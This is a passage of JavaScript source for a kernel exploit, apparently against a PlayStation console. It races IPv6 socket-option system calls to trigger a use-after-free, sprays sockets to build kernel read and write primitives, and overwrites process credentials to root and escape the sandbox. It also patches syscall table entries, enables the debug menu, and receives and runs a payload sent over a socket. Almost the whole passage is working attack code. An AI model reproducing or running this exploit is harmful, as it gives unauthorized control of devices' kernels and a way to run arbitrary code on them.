  const size_of_spray_socks = 0x4 * NUM_SPRAY_SOCKS;
  const size_of_leak_socks = 0x4 * NUM_LEAK_SOCKS;
  const size_of_slave_socks = 0x4 * NUM_SLAVE_SOCKS;
  const size_of_spray_socks_tclasses = 0x4 * NUM_SPRAY_SOCKS;
  const size_of_pktinfo_buffer = 0x18;
  const size_of_pktinfo_buffer_len = 0x8;
  const size_of_find_slave_buffer = 0x8 * NUM_SLAVE_SOCKS + 0x10;
  const size_of_fake_socketops = 0x58;
  const size_of_loop_counter = 0x8;
  const size_of_fix_these_sockets = 0x4 * (NUM_SPRAY_SOCKS + NUM_LEAK_SOCKS + NUM_SLAVE_SOCKS + 0x2) + 0x18;
  const var_memory = p.malloc(size_of_triggered + size_of_valid_pktopts + size_of_size_of_tclass + size_of_master_main_tclass + size_of_master_thr1_tclass + size_of_master_thr2_tclass + size_of_spray_tclass + size_of_taint_tclass + size_of_tmp_tclass +
    size_of_rthdr_buffer + size_of_ptr_size_of_rthdr_buffer+ size_of_spray_socks + size_of_leak_socks + size_of_slave_socks + size_of_spray_socks_tclasses + size_of_pktinfo_buffer + size_of_pktinfo_buffer_len + size_of_find_slave_buffer + size_of_fake_socketops + size_of_loop_counter +
    size_of_fix_these_sockets
  );

  const triggered = var_memory;
  const valid_pktopts = triggered.add32(size_of_triggered);
  const size_of_tclass = valid_pktopts.add32(size_of_valid_pktopts);
  const master_main_tclass = size_of_tclass.add32(size_of_size_of_tclass);
  const master_thr1_tclass = master_main_tclass.add32(size_of_master_main_tclass);
  const master_thr2_tclass = master_thr1_tclass.add32(size_of_master_thr1_tclass);
  const spray_tclass = master_thr2_tclass.add32(size_of_master_thr2_tclass);
  const taint_tclass = spray_tclass.add32(size_of_spray_tclass);
  const tmp_tclass = taint_tclass.add32(size_of_taint_tclass);
  const rthdr_buffer = tmp_tclass.add32(size_of_tmp_tclass);
  const ptr_size_of_rthdr_buffer = rthdr_buffer.add32(size_of_rthdr_buffer);
  const spray_sockets_ptr = ptr_size_of_rthdr_buffer.add32(size_of_ptr_size_of_rthdr_buffer);
  const leak_sockets_ptr = spray_sockets_ptr.add32(size_of_spray_socks);
  const slave_sockets_ptr = leak_sockets_ptr.add32(size_of_leak_socks);
  const spray_socks_tclasses_ptr = slave_sockets_ptr.add32(size_of_slave_socks);
  const pktinfo_buffer = spray_socks_tclasses_ptr.add32(size_of_spray_socks_tclasses);
  const pktinfo_buffer_len = pktinfo_buffer.add32(size_of_pktinfo_buffer);
  const find_slave_buffer = pktinfo_buffer_len.add32(size_of_pktinfo_buffer_len);
  const fake_socketops = find_slave_buffer.add32(size_of_find_slave_buffer);
  const loop_counter = fake_socketops.add32(size_of_fake_socketops);
  const fix_these_sockets_ptr = loop_counter.add32(size_of_loop_counter);

  var overlapped_socket = -1;
  var overlapped_socket_idx = -1;

  var slave_socket = -1;

  var leaked_pktopts_address = 0;

  var target_file;
  var socketops;
  var kernel_base;

  p.write8(valid_pktopts.add32(0x0), 0x14);
  p.write4(valid_pktopts.add32(0x8), IPPROTO_IPV6);
  p.write4(valid_pktopts.add32(0xC), IPV6_TCLASS);
  p.write4(valid_pktopts.add32(0x10), 0x0);

  p.write8(size_of_tclass, 0x4);
  p.write8(spray_tclass, SPRAY_TCLASS);

  p.write8(master_main_tclass, 0x0);
  p.write8(master_thr1_tclass, 0x0);
  p.write8(master_thr2_tclass, 0x0);

  p.write8(taint_tclass, TAINT_CLASS);
  p.write8(tmp_tclass, 0x10);

  p.write8(pktinfo_buffer_len, 0x14);

  //create sockets
  const master_socket = chain.syscall(97, AF_INET6, SOCK_DGRAM, IPPROTO_UDP).low;
  const target_socket = chain.syscall(97, AF_INET6, SOCK_DGRAM, IPPROTO_UDP).low;
  const spare_socket = chain.syscall(97, AF_INET6, SOCK_DGRAM, IPPROTO_UDP).low;

  const this_pid = chain.syscall(20).low;

  {

    for (var i = 0; i < NUM_SPRAY_SOCKS; i++) {
      chain.fcall(window.syscalls[97], AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
      chain.write_result4(spray_sockets_ptr.add32(0x4 * i));
    }
    for (var i = 0; i < NUM_LEAK_SOCKS; i++) {
      chain.fcall(window.syscalls[97], AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
      chain.write_result4(leak_sockets_ptr.add32(0x4 * i));
    }
    for (var i = 0; i < NUM_SLAVE_SOCKS; i++) {
      chain.fcall(window.syscalls[97], AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
      chain.write_result4(slave_sockets_ptr.add32(0x4 * i));
    }
  }
  chain.run();

  const spray_sockets = p.array_from_address(spray_sockets_ptr, NUM_SPRAY_SOCKS);
  const spray_socks_tclasses = p.array_from_address(spray_socks_tclasses_ptr, NUM_SPRAY_SOCKS);

  const leak_sockets = p.array_from_address(leak_sockets_ptr, NUM_LEAK_SOCKS);
  const slave_sockets = p.array_from_address(slave_sockets_ptr, NUM_SLAVE_SOCKS);

  const fix_me = p.array_from_address(fix_these_sockets_ptr, NUM_SPRAY_SOCKS + NUM_LEAK_SOCKS + NUM_SLAVE_SOCKS + 0x2);

  for (var i = 0; i < NUM_SPRAY_SOCKS; i++) {
    fix_me[i] = spray_sockets[i];
  }
  for (var i = 0; i < NUM_LEAK_SOCKS; i++) {
    fix_me[i + NUM_SPRAY_SOCKS] = leak_sockets[i];
  }
  for (var i = 0; i < NUM_SLAVE_SOCKS; i++) {
    fix_me[i + (NUM_SPRAY_SOCKS + NUM_LEAK_SOCKS)] = slave_sockets[i];
  }

  fix_me[NUM_SPRAY_SOCKS + NUM_LEAK_SOCKS + NUM_SLAVE_SOCKS + 0x0] = master_socket;
  fix_me[NUM_SPRAY_SOCKS + NUM_LEAK_SOCKS + NUM_SLAVE_SOCKS + 0x1] = spare_socket;

  for (var i = 0; i < 10; i++) {
    p.write8(fake_socketops.add32(i * 0x8), window.gadgets["ret"]);
  }
  p.write8(fake_socketops.add32(0x50), 1);

  var thr1_start;
  var thr1_ctrl;
  const thread1 = chain.spawn_thread("thread1", function (new_thr) {
    const loop_start = new_thr.get_rsp();
    const trigger_condition = new_thr.create_equal_branch(triggered, 1);

    const triggered_false = new_thr.get_rsp();
    new_thr.syscall_safe(118, master_socket, IPPROTO_IPV6, IPV6_TCLASS, master_thr1_tclass, size_of_tclass);
    const overlap_condition = new_thr.create_equal_branch(master_thr1_tclass, SPRAY_TCLASS);

    const overlap_false = new_thr.get_rsp();
    new_thr.syscall_safe(105, master_socket, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, valid_pktopts, size_of_valid_pktopts);
    new_thr.push(window.gadgets["pop rdi"]);
    var dest_idx = new_thr.pushSymbolic();
    new_thr.push(window.gadgets["pop rsi"]);
    var src_idx = new_thr.pushSymbolic();
    new_thr.push(window.gadgets["mov [rdi], rsi"]);
    var l1 = new_thr.get_rsp();
    new_thr.push(window.gadgets["pop rsp"]);
    var l2 = new_thr.get_rsp();
    new_thr.push(0x43434343);

    new_thr.finalizeSymbolic(dest_idx, l2);
    new_thr.finalizeSymbolic(src_idx, l1);
    thr1_start = loop_start;
    thr1_ctrl = l2;

    const overlap_true = new_thr.get_rsp();
    new_thr.push_write8(triggered, 1);

    const triggered_true = new_thr.get_rsp();
    new_thr.fcall(libKernelBase.add32(OFFSET_lk_pthread_exit), 0);

    new_thr.set_branch_points(trigger_condition, triggered_true, triggered_false);
    new_thr.set_branch_points(overlap_condition, overlap_true, overlap_false);
  });

  //boys dont race too fast now, kthx.
  var me = chain.call(libKernelBase.add32(OFFSET_lk_pthread_self));
  var prio = p.malloc(0x8);
  p.write4(prio, 0x100);
  var r = chain.call(libKernelBase.add32(OFFSET_lk_pthread_setschedparam), me, 1, prio);

  const thread3 = new rop(); {
    //main loop
    const loop_start = thread3.get_rsp();
    //set valid.
    thread3.syscall_safe(105, master_socket, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, valid_pktopts, size_of_valid_pktopts);
    //make thr1 give it a go
    thread3.push_write8(thr1_ctrl, thr1_start);
    thread3.syscall_safe(118, master_socket, IPPROTO_IPV6, IPV6_TCLASS, master_thr2_tclass, size_of_tclass);
    thread3.syscall_safe(105, master_socket, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
    for (var i = 0; i < NUM_SPRAY_SOCKS; i++) {
      thread3.syscall_safe(105, spray_sockets[i], IPPROTO_IPV6, IPV6_TCLASS, spray_tclass, 4);
    }
    thread3.syscall_safe(118, master_socket, IPPROTO_IPV6, IPV6_TCLASS, master_main_tclass, size_of_tclass);
    const overlap_condition = thread3.create_equal_branch(master_main_tclass, SPRAY_TCLASS);
    const overlap_false = thread3.get_rsp();
    for (var i = 0; i < NUM_SPRAY_SOCKS; i++) {
      thread3.syscall_safe(105, spray_sockets[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
    }
    thread3.jmp_rsp(loop_start);
    const overlap_true = thread3.get_rsp();
    thread3.push_write8(triggered, 1);
    thread3.fcall(syscalls[105], master_socket, IPPROTO_IPV6, IPV6_TCLASS, taint_tclass, 4);
    for (var i = 0; i < NUM_SPRAY_SOCKS; i++) {
      thread3.fcall(syscalls[118], spray_sockets[i], IPPROTO_IPV6, IPV6_TCLASS, spray_socks_tclasses_ptr.add32(0x4 * i), size_of_tclass);
    }
    //make sure the thread will exit(?)
    thread3.push_write8(thr1_ctrl, thr1_start);
    thread3.set_branch_points(overlap_condition, overlap_true, overlap_false);
  }
  //trigger uaf
  thread1();
  thread3.run();

  function find_socket_overlap() {
    for (var i = 0; i < NUM_SPRAY_SOCKS; i++) {
      if (spray_socks_tclasses[i] == TAINT_CLASS) {
        overlapped_socket = spray_sockets[i];
        overlapped_socket_idx = i;
        return;
      }
    }
    alert("[ERROR] -> failed to find socket overlap. (should be unreachable) REBOOT");
    while (1) {};
  }

  function fake_pktopts(pktinfo) {
    {

      chain.fcall(libSceLibcInternalBase.add32(OFFSET_libcint_memset), rthdr_buffer, 0x0, 0x100);
      chain.push_write8(rthdr_buffer.add32(0x0), 0x0F001E00);
      chain.push_write8(rthdr_buffer.add32(PKTOPTS_PKTINFO_OFFSET), pktinfo);
      chain.push_write8(loop_counter, 0);
      chain.push_write8(tmp_tclass, 0x1);
      for (var i = 0; i < NUM_LEAK_SOCKS; i++) {
        chain.fcall(syscalls[105], leak_sockets[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
        chain.fcall(syscalls[105], leak_sockets[i], IPPROTO_IPV6, IPV6_TCLASS, tmp_tclass, 4);
      }
      chain.fcall(window.syscalls[105], overlapped_socket, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);

      const loop_start = chain.get_rsp();
      const loop_condition = chain.create_equal_branch(loop_counter, 0x100);

      const loop_condition_false = chain.get_rsp();
      for (var i = 0; i < NUM_LEAK_SOCKS; i++) {
        chain.push_write8(rthdr_buffer.add32(PKTOPTS_TCLASS_OFFSET), (TCLASS_MASTER | i));
        chain.syscall_safe(105, leak_sockets[i], IPPROTO_IPV6, IPV6_RTHDR, rthdr_buffer, 0xF8);
      }
      chain.syscall_safe(118, master_socket, IPPROTO_IPV6, IPV6_TCLASS, tmp_tclass, size_of_tclass);
      const overlap_condition = chain.create_greater_or_equal_branch(tmp_tclass, TCLASS_MASTER);

      const overlap_false = chain.get_rsp();
      chain.push(window.gadgets["pop rax"]);
      chain.push(loop_counter);
      chain.push(window.gadgets["inc dword [rax]"]);
      chain.jmp_rsp(loop_start);

      const loop_condition_true = chain.get_rsp();
      const overlap_true = chain.get_rsp();

      chain.set_branch_points(loop_condition, loop_condition_true, loop_condition_false);
      chain.set_branch_points(overlap_condition, overlap_true, overlap_false);
    }
    chain.run();

    const tclass = p.read4(tmp_tclass);
    if ((tclass & 0xFFFF0000) == TCLASS_MASTER) {
      overlapped_socket_idx = (tclass & 0x0000FFFF);
      overlapped_socket = leak_sockets[overlapped_socket_idx];
      return;
    }
    alert("[ERROR] failed to find RTHDR <-> master socket overlap REBOOT");
    while (1) {};

  }

  function leak_rthdr_address(size) {
    const ip6r_len = ((size >> 3) - 1 & ~1);
    const ip6r_segleft = (ip6r_len >> 1);
    const header = (ip6r_len << 8) + (ip6r_segleft << 24); {
      chain.fcall(libSceLibcInternalBase.add32(OFFSET_libcint_memset), rthdr_buffer, 0x0, size);
      chain.push_write8(rthdr_buffer, header);
      chain.push_write8(ptr_size_of_rthdr_buffer, size);
      chain.fcall(syscalls[105], master_socket, IPPROTO_IPV6, IPV6_RTHDR, rthdr_buffer, ((ip6r_len + 1) << 3));
      chain.fcall(syscalls[118], overlapped_socket, IPPROTO_IPV6, IPV6_RTHDR, rthdr_buffer, ptr_size_of_rthdr_buffer);
    }
    chain.run();
    const kaddress = p.read8(rthdr_buffer.add32(PKTOPTS_RTHDR_OFFSET));
    return kaddress;
  }

  function leak_pktopts() {
    leaked_pktopts_address = leak_rthdr_address(0x100); {
      chain.push_write8(tmp_tclass, 0x10);
      chain.fcall(syscalls[105], master_socket, IPPROTO_IPV6, IPV6_RTHDR, 0, 0);
      for (var i = 0; i < NUM_SLAVE_SOCKS; i++) {
        chain.fcall(syscalls[105], slave_sockets[i], IPPROTO_IPV6, IPV6_TCLASS, tmp_tclass, 4);
      }
    }
    chain.run();
  }

  function find_slave() {
    {
      chain.push_write8(pktinfo_buffer, leaked_pktopts_address.add32(PKTOPTS_PKTINFO_OFFSET));
      chain.push_write8(pktinfo_buffer.add32(0x8), 0);
      chain.push_write8(pktinfo_buffer.add32(0x10), 0);
      chain.fcall(syscalls[105], master_socket, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_buffer, 0x14);
      for (var i = 0; i < NUM_SLAVE_SOCKS; i++) {
        chain.fcall(syscalls[118], slave_sockets[i], IPPROTO_IPV6, IPV6_PKTINFO, find_slave_buffer.add32(0x8 * i), pktinfo_buffer_len);
      }
    }
    chain.run();

    for (var i = 0; i < NUM_SLAVE_SOCKS; i++) {
      if (p.read4(find_slave_buffer.add32(0x8 * i)) == (leaked_pktopts_address.add32(PKTOPTS_PKTINFO_OFFSET)).low) {
        slave_socket = slave_sockets[i];
        return;
      }
    }
    alert("[ERROR] failed to find slave REBOOT");
    while (1) {};
  }

  /*
   * Notes from specter:
   * removed previous crappy write primitives, now uses IPV6 write primitive to establish
   * better write primitive via pipe buffers like UMTX exploit.
   */
  let ipv6_scratch_buf = p.malloc(0x14);

  function write_to_victim(addr)
  {
    chain.push_write8(pktinfo_buffer, addr);
    chain.push_write8(pktinfo_buffer.add32(0x8), 0);
    chain.push_write8(pktinfo_buffer.add32(0x10), 0);
    chain.fcall(syscalls[105], master_socket, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_buffer, 0x14);
    chain.run();
  }

  function ipv6_kread(addr, buffer)
  {
    write_to_victim(addr);
    chain.fcall(syscalls[118], slave_socket, IPPROTO_IPV6, IPV6_PKTINFO, buffer, pktinfo_buffer_len);
    chain.run();
  }

  function ipv6_kwrite(addr, buffer)
  {
    write_to_victim(addr);
    chain.fcall(syscalls[105], slave_socket, IPPROTO_IPV6, IPV6_PKTINFO, buffer, 0x14);
    chain.run();
  }

  function ipv6_kread8(addr) {
    ipv6_kread(addr, ipv6_scratch_buf);
    return p.read8(ipv6_scratch_buf);
  }
  
  
    function brute_force_kernel_map() {
	kernel_base = new int64(0x80200000, 0xFFFFFFFF);//static
  }

  function find_proc() {
    var proc = ipv6_kread8(kernel_base.add32(KERNEL_ALLPROC_OFFSET));
    while (proc.low != 0) {
      var pid = ipv6_kread8(proc.add32(PROC_PID_OFFSET));
      if (pid.low == this_pid) {
        return proc;
      }
      proc = ipv6_kread8(proc);
    }
    alert("[ERROR] failed to find proc REBOOT");
    while (1) {};
  }

  function find_execution_socket() {

    var filedesc = ipv6_kread8(proc.add32(PROC_FILEDESC_OFFSET));
    var ofiles = ipv6_kread8(filedesc);
    target_file = ipv6_kread8(ofiles.add32(0x8 * target_socket))
    socketops = ipv6_kread8(target_file.add32(FILE_FOPS_OFFSET));
  }
  //lower priority
  p.write4(prio, 0x1FF);
  chain.call(libKernelBase.add32(OFFSET_lk_pthread_setschedparam), me, 1, prio);
  //find uaf
  find_socket_overlap();
  //play with uaf
  //alert("play");
  fake_pktopts(0);
  leak_sockets[overlapped_socket_idx] = spare_socket;
  //leak shit
  //alert("leak");
  leak_pktopts();
  fake_pktopts(leaked_pktopts_address.add32(PKTOPTS_PKTINFO_OFFSET));
  //alert("find victim");
  find_slave();
  brute_force_kernel_map();
  const proc = find_proc();
  //alert("here we go!");
  const proc_ucred = ipv6_kread8(proc.add32(PROC_UCRED_OFFSET));
  const proc_fd = ipv6_kread8(proc.add32(PROC_FILEDESC_OFFSET));



  let ofiles_addr         = ipv6_kread8(proc_fd.add32(0x00));
  //alert("ofiles_addr: " + ofiles_addr);
  ofiles_addr.add32inplace(0x08); // account for fdt_nfiles
  let pipe_read           = p.read4(pipe_mem);
  //alert("pipe_read: " + pipe_read);
  let pipe_write          = p.read4(pipe_mem.add32(0x4));
  //alert("pipe_write: " + pipe_write);
  let pipe_filedescent    = ofiles_addr.add32(pipe_read * 0x30);
  let pipe_file           = ipv6_kread8(pipe_filedescent);
  //alert("pipe_file: " + pipe_file);
  let pipe_addr           = ipv6_kread8(pipe_file);
  //alert("pipe_addr: " + pipe_addr);
  let pipemap_buffer	  = malloc(0x14);

  function copyout(src, dest, length) {
    if (typeof copyout.value == 'undefined') {
        copyout.value0 = new int64(0x40000000, 0x40000000);
        copyout.value1 = new int64(0x00000000, 0x40000000);
    }
    p.write8(pipemap_buffer, copyout.value0);
    p.write8(pipemap_buffer.add32(0x8), copyout.value1);
    p.write4(pipemap_buffer.add32(0x10), 0x0);
    ipv6_kwrite(pipe_addr, pipemap_buffer);

    p.write8(pipemap_buffer, src);
    p.write8(pipemap_buffer.add32(0x8), 0x0);
    p.write4(pipemap_buffer.add32(0x10), 0x0);
    ipv6_kwrite(pipe_addr.add32(0x10), pipemap_buffer);

    return chain.syscall(0x003, pipe_read, dest, length); // read
  }

  function copyin(src, dest, length) {
    if (typeof copyin.value == 'undefined') {
        copyin.value = new int64(0x00000000, 0x40000000);
    }

    p.write8(pipemap_buffer, 0x0);
    p.write8(pipemap_buffer.add32(0x8), copyin.value);
    p.write4(pipemap_buffer.add32(0x10), 0x0);
    ipv6_kwrite(pipe_addr, pipemap_buffer);

    p.write8(pipemap_buffer, dest);
    p.write8(pipemap_buffer.add32(0x8), 0x0);
    p.write4(pipemap_buffer.add32(0x10), 0x0);
    ipv6_kwrite(pipe_addr.add32(0x10), pipemap_buffer);

    return chain.syscall(0x004, pipe_write, src, length); // write
  }

  let krw_qword_store = p.malloc(0x8);

  function kernel_write8(kaddr, val) {
    p.write8(krw_qword_store, val);
    copyin(krw_qword_store, kaddr, 0x8);
  }

  function kernel_write4(kaddr, val) {
    p.write4(krw_qword_store, val);
    copyin(krw_qword_store, kaddr, 0x4);
  }

  function kernel_write2(kaddr, val) {
    p.write2(krw_qword_store, val);
    copyin(krw_qword_store, kaddr, 0x2);
  }

  function kernel_write1(kaddr, val) {
    p.write1(krw_qword_store, val);
    copyin(krw_qword_store, kaddr, 0x1);
  }

  function kernel_read8(kaddr) {
    copyout(kaddr, krw_qword_store, 0x8);
    return p.read8(krw_qword_store);
  }

  function kernel_read4(kaddr) {
    copyout(kaddr, krw_qword_store, 0x4);
    return p.read4(krw_qword_store);
  }

  function kernel_read2(kaddr) {
    copyout(kaddr, krw_qword_store, 0x2);
    return p.read2(krw_qword_store);
  }

  function kernel_read1(kaddr) {
    copyout(kaddr, krw_qword_store, 0x1);
    return p.read1(krw_qword_store);
  }

  /*
   * End specter's edits for pipe-based R/W
   */


  
  
  
  

  
  const ROOTVNODE_OFFSET = 0x83EE780;
  const SFF_OFFSET = 0x8117FF4;
  const QAF_OFFSET = 0x8118018;
  const UTF_OFFSET = 0x8118080;
  const PRISON_OFFSET = 0x2B7B5B0;
  
  	function get_kaddr(offset) {
        return kernel_base.add32(offset);
    }
  
  /*
  //CORRECT SUPPOSED QA FLAGS
	00 00 03 01 00 00 00 00
	//CORRECT SUPPOSED UTOKEN FLAGS
	01 00 00 00 00 00 00 00
	//CORRECT SUPPOSED SECURITY FLAGS
	17 00 00 00 00 00 00 01
  */
  
  

  
	// Set security flags
	let security_flags =  kernel_read4(get_kaddr(SFF_OFFSET));
	debug_log("[+] security_flags: " + security_flags);
	 kernel_write4(get_kaddr(SFF_OFFSET), security_flags | 0x14);
	 debug_log("[+] security_flags_after: " + kernel_read4(get_kaddr(SFF_OFFSET)));

	// Set qa flags and utoken flags for debug menu enable
	let qaf_dword =  kernel_read4(get_kaddr(QAF_OFFSET));
	debug_log("[+] qaf_flags_before: " + qaf_dword);
	 kernel_write4(get_kaddr(QAF_OFFSET), qaf_dword | 0x10300);
	 debug_log("[+] qaf_flags_after: " + kernel_read4(get_kaddr(QAF_OFFSET)));

	let utoken_flags =  kernel_read4(get_kaddr(UTF_OFFSET));
	debug_log("[+] utoken_flags_before: " + utoken_flags);
	 kernel_write4(get_kaddr(UTF_OFFSET), utoken_flags | 0x1);
	 debug_log("[+] utoken_flags_after: " +  kernel_read4(get_kaddr(UTF_OFFSET)));
	debug_log("[+] enabled debug menu");

	debug_log("cr_uid before: "  + kernel_read4(proc_ucred.add32(0x04)));
	 kernel_write4(proc_ucred.add32(0x04), 0); // cr_uid
	 debug_log("cr_uid after: "  + kernel_read4(proc_ucred.add32(0x04)));
	 debug_log("cr_ruid before: "  + kernel_read4(proc_ucred.add32(0x08)));
	 kernel_write4(proc_ucred.add32(0x08), 0); // cr_ruid
	 debug_log("cr_ruid after: "  + kernel_read4(proc_ucred.add32(0x08)));
	 debug_log("cr_svuid before: "  + kernel_read4(proc_ucred.add32(0x0C)));
	 kernel_write4(proc_ucred.add32(0x0C), 0); // cr_svuid
	 debug_log("cr_svuid after: "  + kernel_read4(proc_ucred.add32(0x0C)));
	 debug_log("cr_ngroups before: "  + kernel_read4(proc_ucred.add32(0x10)));
	 kernel_write4(proc_ucred.add32(0x10), 1); // cr_ngroups
	 debug_log("cr_ngroups after: "  + kernel_read4(proc_ucred.add32(0x10)));
	 debug_log("cr_rgid before: "  + kernel_read4(proc_ucred.add32(0x14)));
	 kernel_write4(proc_ucred.add32(0x14), 0); // cr_rgid
	 debug_log("cr_rgid after: "  + kernel_read4(proc_ucred.add32(0x14)));

	// Escalate sony privs
	 debug_log("cr_prison before: "  + kernel_read8(proc_ucred.add32(0x30)));
	 kernel_write8(proc_ucred.add32(0x30), kernel_read8(new int64(0x81726AE0, 0xFFFFFFFF))); // cr_prison = got_prison0 address
	 debug_log("cr_prison after: "  + kernel_read8(proc_ucred.add32(0x30)));
	 debug_log("auth_id_before: "  + kernel_read8(proc_ucred.add32(0x58)));
	 kernel_write8(proc_ucred.add32(0x58), new int64(0x00000013, 0x48010000)); // cr_sceAuthId
	 debug_log("auth_id after: "  + kernel_read8(proc_ucred.add32(0x58)));
	 debug_log("cr_sceCaps 0 before: "  + kernel_read8(proc_ucred.add32(0x60)));
	 kernel_write8(proc_ucred.add32(0x60), new int64(0xFFFFFFFF, 0xFFFFFFFF)); // cr_sceCaps[0]
	 debug_log("cr_sceCaps 0 after: "  + kernel_read8(proc_ucred.add32(0x60)));
	 debug_log("cr_sceCaps 1 before: "  + kernel_read8(proc_ucred.add32(0x68)));
	 kernel_write8(proc_ucred.add32(0x68), new int64(0xFFFFFFFF, 0xFFFFFFFF)); // cr_sceCaps[1]
	 debug_log("cr_sceCaps 1 after: "  + kernel_read8(proc_ucred.add32(0x68)));
	 debug_log("cr_sceAttr 0 before: "  + kernel_read4(proc_ucred.add32(0x80)));
	 let attrs = kernel_read4(proc_ucred.add32(0x80));
		attrs &= 0xFFFFFF;
		attrs |= 0x80 << 24;
		kernel_write4(proc_ucred.add32(0x80), attrs);                       // cr_sceAttr[0]
	 debug_log("cr_sceAttr 0 after: "  + kernel_read4(proc_ucred.add32(0x80)));
	// Remove dynlib restriction
    let proc_pdynlib_offset = proc.add32(0x3E8);
    let proc_pdynlib_addr = kernel_read8(proc_pdynlib_offset);

    let restrict_flags_addr = proc_pdynlib_addr.add32(0x118);
    kernel_write4(restrict_flags_addr, 0);

    let libkernel_ref_addr = proc_pdynlib_addr.add32(0x18);
    kernel_write8(libkernel_ref_addr, new int64(1, 0));
	
	let cur_uid = chain.syscall(0x018);
    debug_log("[+] we root now? uid=0x" + cur_uid);
	
	let is_in_sandbox = chain.syscall(0x249);
	debug_log("[+] we escaped now? in sandbox: " + is_in_sandbox);
	let rootvnode =  kernel_read8(get_kaddr(ROOTVNODE_OFFSET));
	debug_log("fd_rdir before: "  + kernel_read8(proc_fd.add32(0x10)));
     kernel_write8(proc_fd.add32(0x10), rootvnode); // fd_rdir
	 debug_log("fd_rdir after: "  + kernel_read8(proc_fd.add32(0x10)));
	 debug_log("fd_jdir before: "  + kernel_read8(proc_fd.add32(0x18)));
     kernel_write8(proc_fd.add32(0x18), rootvnode); // fd_jdir
	 debug_log("fd_rdir after: "  + kernel_read8(proc_fd.add32(0x18)));
	is_in_sandbox = chain.syscall(0x249);
    debug_log("[+] we escaped now? after in sandbox: " + is_in_sandbox);
	
	//alert("before trampoline");
	/*
	FFFFFFFF8026DAB0 FF 26 trampoline
	FFFFFFFF815056D8 syscall 11 offset
	*/
	
	//alert("after trampoline");
  
	let uid_is_set = chain.syscall(23, 0);
	
	//alert("trampoline_buffer" + trampoline_buffer);
	//alert("val before: " + kernel_read8(new int64(0x814FC7E0,0xFFFFFFFF)));
	//alert("val2 before: " + kernel_read8(new int64(0x814FC808,0xFFFFFFFF)));
	//alert("val3 before: " + kernel_read8(new int64(0x815056D0,0xFFFFFFFF)));
	//alert("val4 before: " + kernel_read8(new int64(0x815056F8,0xFFFFFFFF)));
	kernel_write4(new int64(0x814FC7E0,0xFFFFFFFF), 0x00000002);
	kernel_write4(new int64(0x814FC80C,0xFFFFFFFF), 0x00000001);
	kernel_write8(new int64(0x814FC7E8,0xFFFFFFFF), new int64(0x8026DAB0,0xFFFFFFFF));
	kernel_write8(new int64(0x815056D8,0xFFFFFFFF), new int64(0x8026DAB0,0xFFFFFFFF));
	kernel_write4(new int64(0x815056D0,0xFFFFFFFF), 0x00000002);
	kernel_write4(new int64(0x815056FC,0xFFFFFFFF), 0x00000001);
	
	//alert("val: " + kernel_read8(new int64(0x814FC7E0,0xFFFFFFFF)));
	//alert("val2: " + kernel_read8(new int64(0x814FC808,0xFFFFFFFF)));
	//alert("val3: " + kernel_read8(new int64(0x815056D0,0xFFFFFFFF)));
	//alert("val4: " + kernel_read8(new int64(0x815056F8,0xFFFFFFFF)));
	//alert("uid_is_set: 0x" + uid_is_set.low);

/*
	//payload loader example
	int sock = socket("loader",2,1,0); //needs to be done before any sock clusterfuck is being ran, this is dump_sock_fd
	bind(sock,sockaddr,16);//sockaddr is dump_sock_addr_store
	listen(sock,10);
	int address = 0x926300000;
	int accepted = accept(sock,0,0);
	while(1){
		int recvd = recv(accepted,address,4096,0);
		if(recvd <= 0){
			break;
		}
		address += recvd;
	}
	close(sock);
	close(accepted);
	return 0;
*/

	alert("before sending payload");
	let write_ptr = payload_buffer.add32(0x0);
	for (;;) {
		let recvd = chain.syscall(3, accepted, write_ptr, 4096).low;
		if (recvd == 0xFFFFFFFF || recvd == 0) {
			break;
		}
		write_ptr.add32inplace(recvd);
	}
	//alert("received");
	let clsd = chain.syscall(6, dump_sock_fd);
	let clsd2 = chain.syscall(6, accepted);
	
	let test_payload_store = p.malloc(0x8);
	
	
	let kdata_base = new int64(0x81726600, 0xffffffff);

	// Arguments to entrypoint
	
	let rwpair_mem              = p.malloc(0x8);
	let args                    = p.malloc(0x8 * 5);

	// Pass master/victim pair to payload so it can do read/write
	p.write4(rwpair_mem.add32(0x00), master_socket);
	p.write4(rwpair_mem.add32(0x04), slave_socket);
	
	p.write8(args.add32(0x00), libKernelBase.add32(0x1D3D0));         	// arg1 = dlsym_t* dlsym
	p.write8(args.add32(0x08), pipe_mem);         						// arg2 = int *rwpipe[2]
	p.write8(args.add32(0x10), rwpair_mem);         					// arg3 = int *rwpair[2]
	p.write8(args.add32(0x18), proc);          							// arg4 = uint64_t proc
	p.write8(args.add32(0x20), pipe_addr);								// arg5 = uint64_t pipe_addr
	
	let pthread_handle_store = p.malloc(0x8);
	let pthread_value_store = p.malloc(0x8);
	chain.call(libKernelBase.add32(OFFSET_lk_pthread_create_name_np), pthread_handle_store, 0x0, payload_buffer, args, p.stringify("payload"));
	chain.call(libKernelBase.add32(OFFSET_lk_pthread_join), p.read8(pthread_handle_store), pthread_value_store);
}

const stack_sz = 0x40000;
const reserve_upper_stack = 0x8000;
const stack_reserved_idx = reserve_upper_stack / 4;


// Class for quickly creating and managing a ROP chain
window.rop = function () {
  this.stackback = p.malloc32(stack_sz / 4 + 0x8);
  this.stack = this.stackback.add32(reserve_upper_stack);
  this.stack_array = this.stackback.backing;
  this.retval = this.stackback.add32(stack_sz);
  this.count = 1;
  this.branches_count = 0;
  this.branches_rsps = p.malloc(0x200);

  this.clear = function () {
    this.count = 1;
    this.branches_count = 0;

    for (var i = 1; i < ((stack_sz / 4) - stack_reserved_idx); i++) {
      this.stack_array[i + stack_reserved_idx] = 0;
    }
  };

  this.pushSymbolic = function () {
    this.count++;
    return this.count - 1;
  }

  this.finalizeSymbolic = function (idx, val) {
    if (val instanceof int64) {
      this.stack_array[stack_reserved_idx + idx * 2] = val.low;
      this.stack_array[stack_reserved_idx + idx * 2 + 1] = val.hi;
    } else {
      this.stack_array[stack_reserved_idx + idx * 2] = val;
      this.stack_array[stack_reserved_idx + idx * 2 + 1] = 0;
    }
  }

  this.push = function (val) {
